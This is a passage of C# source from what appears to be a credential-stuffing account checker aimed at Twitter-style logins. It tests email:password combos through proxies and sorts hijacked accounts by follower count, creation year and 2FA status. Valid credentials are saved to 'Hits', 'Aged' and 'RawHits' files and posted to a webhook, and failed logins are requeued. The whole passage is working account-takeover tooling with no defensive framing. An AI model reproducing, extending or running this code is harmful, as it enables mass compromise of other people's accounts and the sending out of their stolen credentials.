							Save.Writeline("| Proxy IP: " + text21 + " (" + text22 + ")", "50K+", Save.mainDir + "/Followers/");
							Save.Writeline("   ", "50K+", Save.mainDir + "/Followers/");
							Save.Writeline(combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")", "line_50K+", Save.mainDir + "/Followers/");
							Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
							Save.Writeline(screen_name2 + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
							return;
						}
						if (readConfig.use50kmore2)
						{
							string username32 = "[2FA] 50K+";
							string content32 = combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Challenge: " + text17 + text18 + " Proxy IP: " + text21 + " (" + text22 + ")";
							SendWebhook(url, username32, content32);
						}
						Stats.PREKOPEDESET2FA++;
						Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "50K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("| Username: @" + screen_name2, "50K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("| Followers: " + normal_followers_count2, "50K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("| Created: " + text19, "50K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("| Country: " + text20, "50K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("| Challenge: " + text17, "50K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("| Proxy IP: " + text21 + " (" + text22 + ")", "50K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("   ", "50K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline(combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Challenge: " + text17 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")", "line_50K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
						Save.Writeline(screen_name2 + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
						return;
					}
					int num4;
					switch (text19)
					{
					default:
						num4 = ((text19 == "2009") ? 1 : 0);
						break;
					case "2006":
					case "2007":
					case "2008":
						num4 = 1;
						break;
					}
					if (num4 != 0)
					{
						if (text17 == "RetypeScreenName")
						{
							if (readConfig.useaged)
							{
								string username33 = "Aged";
								string content33 = combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")";
								SendWebhook(url, username33, content33);
							}
							Stats.GOD2006++;
							Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "Aged", Save.mainDir + "/Aged/");
							Save.Writeline("| Username: @" + screen_name2, "Aged", Save.mainDir + "/Aged/");
							Save.Writeline("| Followers: " + normal_followers_count2, "Aged", Save.mainDir + "/Aged/");
							Save.Writeline("| Created: " + text19, "Aged", Save.mainDir + "/Aged/");
							Save.Writeline("| Country: " + text20, "Aged", Save.mainDir + "/Aged/");
							Save.Writeline("| Proxy IP: " + text21 + " (" + text22 + ")", "Aged", Save.mainDir + "/Aged/");
							Save.Writeline("   ", "Aged", Save.mainDir + "/Aged/");
							Save.Writeline(combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")", "line_Aged", Save.mainDir + "/Aged/");
							Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
							Save.Writeline(screen_name2 + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
							return;
						}
						if (readConfig.useaged2)
						{
							string username34 = "[2FA] Aged";
							string content34 = combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Challenge: " + text17 + text18 + " Proxy IP: " + text21 + " (" + text22 + ")";
							SendWebhook(url, username34, content34);
						}
						Stats.GOD20062++;
						Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "Aged [2FA]", Save.mainDir + "/Aged/");
						Save.Writeline("| Username: @" + screen_name2, "Aged [2FA]", Save.mainDir + "/Aged/");
						Save.Writeline("| Followers: " + normal_followers_count2, "Aged [2FA]", Save.mainDir + "/Aged/");
						Save.Writeline("| Created: " + text19, "Aged [2FA]", Save.mainDir + "/Aged/");
						Save.Writeline("| Country: " + text20, "Aged [2FA]", Save.mainDir + "/Aged/");
						Save.Writeline("| Challenge: " + text17, "Aged [2FA]", Save.mainDir + "/Aged/");
						Save.Writeline("| Proxy IP: " + text21 + " (" + text22 + ")", "Aged [2FA]", Save.mainDir + "/Aged/");
						Save.Writeline("   ", "Aged [2FA]", Save.mainDir + "/Aged/");
						Save.Writeline(combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Challenge: " + text17 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")", "line_Aged [2FA]", Save.mainDir + "/Aged/");
						Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
						Save.Writeline(screen_name2 + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
					}
					else if (text17 == "RetypeScreenName")
					{
						if (readConfig.usehits)
						{
							string username35 = "Hits";
							string content35 = combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")";
							SendWebhook(url, username35, content35);
						}
						Stats.NORMALHITS++;
						Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "Hits", Save.mainDir);
						Save.Writeline("| Username: @" + screen_name2, "Hits", Save.mainDir);
						Save.Writeline("| Followers: " + normal_followers_count2, "Hits", Save.mainDir);
						Save.Writeline("| Created: " + text19, "Hits", Save.mainDir);
						Save.Writeline("| Country: " + text20, "Hits", Save.mainDir);
						Save.Writeline("| Proxy IP: " + text21 + " (" + text22 + ")", "Hits", Save.mainDir);
						Save.Writeline("   ", "Hits", Save.mainDir);
						Save.Writeline(combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")", "line_Hits", Save.mainDir);
						Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
						Save.Writeline(screen_name2 + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
					}
					else
					{
						if (readConfig.usehits2)
						{
							string username36 = "[2FA] Hits";
							string content36 = combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Challenge: " + text17 + text18 + " Proxy IP: " + text21 + " (" + text22 + ")";
							SendWebhook(url, username36, content36);
						}
						Stats.HITS2FA++;
						Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "Hits [2FA]", Save.mainDir);
						Save.Writeline("| Username: @" + screen_name2, "Hits [2FA]", Save.mainDir);
						Save.Writeline("| Followers: " + normal_followers_count2, "Hits [2FA]", Save.mainDir);
						Save.Writeline("| Created: " + text19, "Hits [2FA]", Save.mainDir);
						Save.Writeline("| Country: " + text20, "Hits [2FA]", Save.mainDir);
						Save.Writeline("| Challenge: " + text17, "Hits [2FA]", Save.mainDir);
						Save.Writeline("| Proxy IP: " + text21 + " (" + text22 + ")", "Hits [2FA]", Save.mainDir);
						Save.Writeline("   ", "Hits [2FA]", Save.mainDir);
						Save.Writeline(combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Challenge: " + text17 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")", "line_Hits [2FA]", Save.mainDir);
						Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
						Save.Writeline(screen_name2 + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
					}
				}
				else
				{
					Stats.HITS2FA++;
					Save.Writeline(combo.Email + ":" + combo.Pass, "Hits-NOCAPTURE [2FA]", Save.mainDir);
				}
				return;
			}
			if (text4.Contains("Could not authenticate you"))
			{
				if (Stats.DRUGICHECKED < Uploader.accountList.Count)
				{
					Stats.DRUGICHECKED++;
				}
				Stats.NORMALFAILS++;
				if (readConfig.saveFail)
				{
					Save.Writeline(combo.Email + ":" + combo.Pass, "Fails", Save.mainDir + "/Fails/");
				}
			}
			else if (text4.Contains("User has been suspended"))
			{
				if (Stats.DRUGICHECKED < Uploader.accountList.Count)
				{
					Stats.DRUGICHECKED++;
				}
				Stats.NORMALFAILS++;
			}
			else if (text4.Contains("limit for login attempts"))
			{
				if (Stats.DRUGICHECKED < Uploader.accountList.Count)
				{
					Stats.DRUGICHECKED++;
				}
				Stats.NORMALFAILS++;
			}
			else
			{
				Interlocked.Increment(ref Stats.NORMALRETRIES);
				if (Stats.DRUGICHECKED < Uploader.accountList.Count)
				{
					Stats.DRUGICHECKED++;
				}
				Data item = new Data(combo.Email, combo.Pass);
				Helper.ComboQueue.Enqueue(item);
			}
		}
		catch (Exception)
		{
			Interlocked.Increment(ref Stats.NORMALRETRIES);
			Data item2 = new Data(combo.Email, combo.Pass);
			Helper.ComboQueue.Enqueue(item2);
		}
	}

	public static string RandomString(string input)
	{
		Random random = new Random();
		string text = "abcdefhijklmnopqrstuvwxyz";
		string text2 = "1234567899abcdefhijklmnopqrstuvwxyz";
		for (int i = 0; i < input.Length; i = checked(i + 1))
		{
			if (input[i] == '*')
			{
				int index = random.Next(0, text.Length);
				input = input.Remove(i, 1).Insert(i, text[index].ToString());
			}
			else if (input[i] == '/')
			{
				int index2 = random.Next(0, text2.Length);
				input = input.Remove(i, 1).Insert(i, text2[index2].ToString());
			}
		}
		return input;
	}
}
